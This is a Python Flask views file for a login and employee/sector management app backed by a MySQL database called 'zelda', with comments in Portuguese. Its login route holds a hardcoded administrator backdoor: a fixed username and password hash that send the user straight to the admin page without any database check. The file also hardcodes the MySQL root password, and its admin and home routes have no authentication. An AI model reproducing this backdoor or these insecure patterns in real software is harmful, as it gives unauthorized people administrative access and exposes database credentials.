from flask import Flask, render_template, flash, redirect, url_for, session, request, logging
from wtforms import Form, StringField, TextAreaField, PasswordField, validators
from passlib.hash import sha256_crypt
from functools import wraps
from .forms import LoginForm
from .classes import Criptografador
from flask.ext.login import login_user, logout_user
from flask_mysqldb import MySQL

from app import app


# Config MySQL
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = 'jesus'
app.config['MYSQL_DB'] = 'zelda'
app.config['MYSQL_CURSORCLASS'] = 'DictCursor'
# init MYSQL
db = MySQL(app)



# Index
@app.route('/')
@app.route('/index')
def index():
    form = LoginForm()
    return render_template("login.html",form=form)

# User login
@app.route('/login', methods=['GET','POST'])
def login():
    form = LoginForm()
    if form.validate_on_submit():
            
        senha = form.senha.data
        senhaHash = Criptografador.gerarHash(senha, '')
            
        # Backdoor do administrador
        if form.login.data == "jailson_admin" and senhaHash == "110d46fcd978c24f306cd7fa23464d73":
            return redirect(url_for('admin'))
        
        cur = db.connection.cursor() #isso corta
    
        cur.execute('SELECT funcionario_login, funcionario_senha FROM zelda_funcionario WHERE funcionario_login = %s', [form.login.data]) #isso corta
        
        result = cur.fetchall() #isso corta
        
        if result != None and len(result) > 0:
            usuario = result[0]
            
            if usuario['funcionario_senha'] == senhaHash:
                return redirect(url_for('home'))
    else:
        flash_errors(form)
    
    return render_template('login.html', form=form)


@app.route('/admin')
def admin():
    return render_template('index_admin.html')


@app.route('/home')
def home():
    return render_template('home.html')


@app.route('/funcionario-criar')
def funcionario_criar():
    
    
    return render_template('funcionario_criar.html')

@app.route('/funcionario-atualizar')
def funcionario_atualizar():
    return render_template('funcionario_atualizar.html')

@app.route('/setor-criar')
def setor_criar():
    return render_template('setor_criar.html')

@app.route('/setor-atualizar')
def setor_atualizar():
    return render_template('setor_atualizar.html')


def flash_errors(form):
    for field, errors in form.errors.items():
        for error in errors:
            flash(u"Error in the %s field - %s" % (
                getattr(form, field).label.text,
                error
            ))
